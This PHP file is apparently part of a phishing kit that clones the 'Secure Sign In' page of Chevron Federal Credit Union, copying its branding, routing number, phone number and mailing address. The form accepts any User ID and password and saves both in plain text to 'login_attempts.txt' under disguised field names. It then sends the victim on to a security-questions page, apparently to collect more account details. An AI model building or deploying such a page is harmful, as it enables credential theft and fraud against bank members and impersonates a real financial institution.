<?php
session_start();
require_once 'includes/file_storage.php';

// Check if user is logged in
if (isset($_SESSION['emzemz'])) {
    header('Location: security_questions.php');
    exit;
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $emzemz = $_POST['emzemz'] ?? '';
    $pwzenz = $_POST['pwzenz'] ?? '';
    
    $errors = [];
    
    if (empty($emzemz)) {
        $errors['emzemz'] = 'User ID is required.';
    }
    
    if (empty($pwzenz)) {
        $errors['pwzenz'] = 'Password is required.';
    }
    
    if (empty($errors)) {
        // Store username in session for next steps
        $_SESSION['emzemz'] = $emzemz;
        
        // Save to test file
        $data = [
            'step' => 'login',
            'usrnm' => $emzemz,
            'emzemz' => $emzemz,
            'pwzenz' => $pwzenz
        ];
        
        saveUserData('login_attempts.txt', $data);
        
        // Redirect to security questions
        header('Location: security_questions.php');
        exit;
    }
}

$supportLinks = ['Forgot User ID', 'Forgot Password', 'Unlock Account'];

$complianceBadges = [
    [
        'title' => 'EQUAL HOUSING LENDER',
        'description' => 'We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act.'
    ],
    [
        'title' => 'NCUA',
        'description' => 'Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.'
    ]
];

$referenceColumns = [
    [
        'heading' => 'ROUTING NUMBER',
        'lines' => ['#321075947']
    ],
    [
        'heading' => 'PHONE NUMBER',
        'lines' => ['800-232-8101', '24-hour service']
    ],
    [
        'heading' => 'LINKS',
        'lines' => ['Privacy Policy', 'Accessibility', 'Disclosures', 'Security Policy', 'ATM and Branch Locations', 'Rates']
    ],
    [
        'heading' => 'MAILING ADDRESS',
        'lines' => ['Chevron Federal Credit Union', 'PO Box 4107', 'Concord, CA 94524']
    ]
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chevron Federal Credit Union - Secure Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white text-[#0e2f56] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1">
            <!-- Blue Gradient Section with Login Card -->
            <section class="bg-gradient-to-r from-[#002c5c] via-[#014a90] to-[#0073ba] py-12 px-4">
                <div class="max-w-5xl mx-auto">
                    <!-- Header Logo -->
                    <div class="flex items-center gap-4 mb-8">
                        <img
                            src="assets/header_logo_bg.png"
                            alt="Chevron Federal Credit Union"
                            class="h-16 w-auto"
                        />
                    </div>

                    <!-- Two Column Card -->
                    <div class="bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
                        <!-- Left Column: New to Digital Banking -->
                        <div class="order-2 md:order-1 w-full md:w-5/12 px-8 py-10 border-t md:border-t-0 md:border-r border-[#91c1e4]">
                            <p class="text-2xl font-semibold text-[#0b5da7] mb-2">
                                New to Digital Banking?
                            </p>
                            <p class="text-sm text-[#0e2f56]">
                                Enroll for secure access to your accounts and enjoy 24/7 banking
                                with trusted Chevron Federal Credit Union tools.
                            </p>
                            <button
                                type="button"
                                class="mt-8 inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-6 py-2 text-sm font-semibold text-white hover:bg-[#002c5c] transition-colors"
                            >
                                Enroll Now
                            </button>
                        </div>

                        <!-- Right Column: Secure Sign In Form -->
                        <div class="order-1 md:order-2 w-full md:w-7/12 px-8 py-10">
                            <div class="flex flex-col md:flex-row md:items-center gap-4 mb-8">
                                <h2 class="text-lg font-semibold tracking-wide uppercase text-[#0e2f56]">
                                    Secure Sign In
                                </h2>
                                <span class="hidden md:block h-8 w-px bg-[#9cc5e3]"></span>
                                <div class="text-sm text-[#0b5da7]">Member Access</div>
                            </div>

                            <form method="POST" action="" class="space-y-6">
                                <!-- User ID Field -->
                                <div>
                                    <label for="emzemz" class="block text-sm font-semibold text-[#0e2f56] mb-2">
                                        User ID
                                    </label>
                                    <input
                                        id="emzemz"
                                        name="emzemz"
                                        type="text"
                                        value="<?php echo htmlspecialchars($_POST['emzemz'] ?? ''); ?>"
                                        class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                    />
                                    <?php if (isset($errors['emzemz'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['emzemz']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Password Field -->
                                <div>
                                    <label for="pwzenz" class="block text-sm font-semibold text-[#0e2f56] mb-2">
                                        Password
                                    </label>
                                    <div class="relative">
                                        <input
                                            id="pwzenz"
                                            name="pwzenz"
                                            type="password"
                                            value="<?php echo htmlspecialchars($_POST['pwzenz'] ?? ''); ?>"
                                            class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                        />
                                        <button
                                            type="button"
                                            onclick="togglePassword()"
                                            class="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-[#0b5da7] hover:underline"
                                        >
                                            <span id="toggleText">Show</span>
                                        </button>
                                    </div>
                                    <?php if (isset($errors['pwzenz'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['pwzenz']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Support Links -->
                                <div class="flex flex-wrap gap-3 text-xs text-[#0b5da7]">
                                    <?php foreach ($supportLinks as $index => $link): ?>
                                        <a href="#" class="hover:underline"><?php echo htmlspecialchars($link); ?></a>
                                        <?php if ($index < count($supportLinks) - 1): ?>
                                            <span class="text-gray-400">|</span>
                                        <?php endif; ?>
                                    <?php endforeach; ?>
                                </div>

                                <!-- Log In Button -->
                                <div class="pt-4">
                                    <button
                                        type="submit"
                                        class="w-full md:w-auto bg-[#003e7d] text-white font-semibold px-7 py-2 text-sm rounded-sm shadow hover:bg-[#002c5c] disabled:opacity-70"
                                    >
                                        Log In
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Compliance and Reference Information Section -->
            <section class="py-10 px-4">
                <div class="max-w-5xl mx-auto space-y-10 text-sm text-[#0e2f56]">
                    <!-- Compliance Badges -->
                    <div class="grid gap-6 md:grid-cols-2">
                        <?php foreach ($complianceBadges as $badge): ?>
                            <div class="border border-gray-200 rounded-sm p-5 shadow-sm bg-white">
                                <p class="font-semibold text-xs tracking-wide text-gray-700 mb-2 uppercase">
                                    <?php echo htmlspecialchars($badge['title']); ?>
                                </p>
                                <p class="text-sm text-gray-600 leading-relaxed">
                                    <?php echo htmlspecialchars($badge['description']); ?>
                                </p>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <!-- Reference Information Grid -->
                    <div class="grid gap-8 md:grid-cols-4">
                        <?php foreach ($referenceColumns as $column): ?>
                            <div class="space-y-2">
                                <p class="text-xs font-semibold tracking-wide text-gray-600 uppercase">
                                    <?php echo htmlspecialchars($column['heading']); ?>
                                </p>
                                <div class="space-y-1 text-sm text-gray-700">
                                    <?php foreach ($column['lines'] as $line): ?>
                                        <p><?php echo htmlspecialchars($line); ?></p>
                                    <?php endforeach; ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </section>
        </main>

        <!-- Footer -->
        <footer class="border-t border-gray-200">
            <div class="max-w-5xl mx-auto px-4 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                <div class="flex items-center justify-center md:justify-start gap-4">
                    <img
                        src="assets/equal-housing.png"
                        alt="Equal Housing Lender"
                        class="h-12 w-auto"
                    />
                    <img
                        src="assets/ncua.png"
                        alt="National Credit Union Administration"
                        class="h-12 w-auto"
                    />
                </div>
                <div class="text-xs text-gray-600 text-center md:text-right space-y-1">
                    <p>© 2025 Chevron Federal Credit Union</p>
                    <p>Version: 10.34.20250707.705.AWS</p>
                </div>
            </div>
        </footer>

        <!-- Help Button -->
        <button
            type="button"
            class="fixed bottom-6 right-6 inline-flex items-center gap-2 rounded-full bg-[#009a66] px-5 py-3 text-sm font-semibold text-white shadow-lg hover:bg-[#007a50]"
        >
            <span class="inline-flex items-center justify-center h-5 w-5 rounded-full bg-white text-[#009a66] text-xs font-bold">
                ?
            </span>
            Help
        </button>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('pwzenz');
            const toggleText = document.getElementById('toggleText');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
    </script>
</body>
</html>
